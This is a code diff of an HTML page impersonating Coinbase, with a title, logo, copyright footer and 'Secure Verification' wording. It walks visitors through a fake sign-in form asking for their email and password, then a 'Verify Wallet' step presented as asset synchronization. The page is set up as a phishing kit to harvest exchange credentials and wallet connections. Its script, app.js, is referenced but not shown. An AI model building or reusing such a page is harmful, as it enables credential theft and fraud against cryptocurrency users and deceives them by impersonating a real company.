@@ -1,130 +1,43 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Coinbase | Secure Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --cb-blue: #0052ff;
-            --cb-dark: #0a0b0d;
-            --cb-white: #ffffff;
-            --cb-grey: #5b616e;
-            --cb-border: #eceff1;
-        }
-        body {
-            background-color: var(--cb-white);
-            color: var(--cb-dark);
-            font-family: 'Inter', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            -webkit-font-smoothing: antialiased;
-        }
-        .container {
-            text-align: center;
-            width: 100%;
-            max-width: 420px;
-            padding: 20px;
-        }
-        .hidden { display: none !important; }
-        .auth-card {
-            background: white;
-            border: 1px solid var(--cb-border);
-            padding: 40px 30px;
-            border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
-        }
-        .cb-logo {
-            width: 40px; 
-            height: 40px; 
-            object-fit: contain; 
-            margin: 0 auto 20px; 
-            display: block;
-            filter: contrast(1.1) brightness(1.1);
-        }
-        h1 { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
-        p { font-size: 15px; color: var(--cb-grey); line-height: 1.5; margin-bottom: 30px; }
-        .btn-primary {
-            background-color: var(--cb-blue);
-            color: white;
-            border: none;
-            padding: 14px 30px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 50px;
-            cursor: pointer;
-            width: 100%;
-            transition: 0.2s;
-        }
-        .btn-primary:hover { background-color: #0042cd; }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin-bottom: 15px;
-            border: 1px solid var(--cb-border);
-            border-radius: 8px;
-            box-sizing: border-box;
-            font-family: 'Inter';
-        }
-        .footer {
-            margin-top: 40px;
-            font-size: 11px;
-            color: #9ca3af;
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-        }
-        .footer a { color: #9ca3af; text-decoration: none; }
-    </style>
-</head>
-<body>
-
-    <div class="container">
-        
-        <!-- STEP 1: Landing -->
-        <div id="step-1" class="auth-card">
-            <img src="logo.png" class="cb-logo" alt="Coinbase">
-                <svg width="24" height="24" viewBox="0 0 100 100"><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
-            </div>
-            <h1>Coinbase</h1>
-            <p>Securely manage your digital assets and stay updated with your portfolio synchronization.</p>
-            <button id="toStep2" class="btn-primary">Get Started</button>
+<div class="container">
+    
+    <!-- STEP 1: Landing -->
+    <div id="step-1" class="auth-card">
+        <img src="logo.png" class="cb-logo" alt="Coinbase">
+            <svg width="24" height="24" viewBox="0 0 100 100"><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
         </div>
-
-        <!-- STEP 2: Email & Password (Combined) -->
-        <div id="step-2" class="auth-card hidden">
-            <img src="logo.png" class="cb-logo" alt="Coinbase">
-                <svg width="24" height="24" viewBox="0 0 100 100"><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
-            </div>
-            <h1>Sign In</h1>
-            <p>Please enter your account credentials.</p>
-            <input type="email" id="email" placeholder="Email Address">
-            <input type="password" id="pass" placeholder="Password">
-            <button id="toStep3" class="btn-primary">Continue</button>
-        </div>
-
-        <!-- STEP 3: Wallet Connect -->
-        <div id="step-3" class="auth-card hidden">
-            <img src="logo.png" class="cb-logo" alt="Coinbase">
-                <svg width="24" height="24" viewBox="0 0 100 100"><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
-            </div>
-            <h1 style="font-size: 22px;">Security Verification</h1>
-            <p>To ensure account safety, please verify your wallet address to proceed with asset synchronization.</p>
-            <button id="connectBtn" class="btn-primary">Verify Wallet</button>
-            <div id="status" style="margin-top: 20px; color: var(--cb-blue); font-size: 14px;"></div>
-        </div>
-
-        <div class="footer">
-            <span>© 2026 Coinbase, Inc.</span>
-            <a href="#">Privacy Policy</a>
-            <a href="#">Terms of Service</a>
-        </div>
+        <h1>Coinbase</h1>
+        <p>Securely manage your digital assets and stay updated with your portfolio synchronization.</p>
+        <button id="toStep2" class="btn-primary">Get Started</button>
     </div>
 
-    <script src="app.js"></script>
-</body>
-</html>
+    <!-- STEP 2: Email & Password (Combined) -->
+    <div id="step-2" class="auth-card hidden">
+        <img src="logo.png" class="cb-logo" alt="Coinbase">
+            <svg width="24" height="24" viewBox="0 0 100 100"><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
+        </div>
+        <h1>Sign In</h1>
+        <p>Please enter your account credentials.</p>
+        <input type="email" id="email" placeholder="Email Address">
+        <input type="password" id="pass" placeholder="Password">
+        <button id="toStep3" class="btn-primary">Continue</button>
+    </div>
+
+    <!-- STEP 3: Wallet Connect -->
+    <div id="step-3" class="auth-card hidden">
+        <img src="logo.png" class="cb-logo" alt="Coinbase">
+            <svg width="24" height="24" viewBox="0 0 100 100"><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
+        </div>
+        <h1 style="font-size: 22px;">Security Verification</h1>
+        <p>To ensure account safety, please verify your wallet address to proceed with asset synchronization.</p>
+        <button id="connectBtn" class="btn-primary">Verify Wallet</button>
+        <div id="status" style="margin-top: 20px; color: var(--cb-blue); font-size: 14px;"></div>
+    </div>
+
+    <div class="footer">
+        <span>© 2026 Coinbase, Inc.</span>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Terms of Service</a>
+    </div>
+</div>
+
+<script src="app.js"></script>
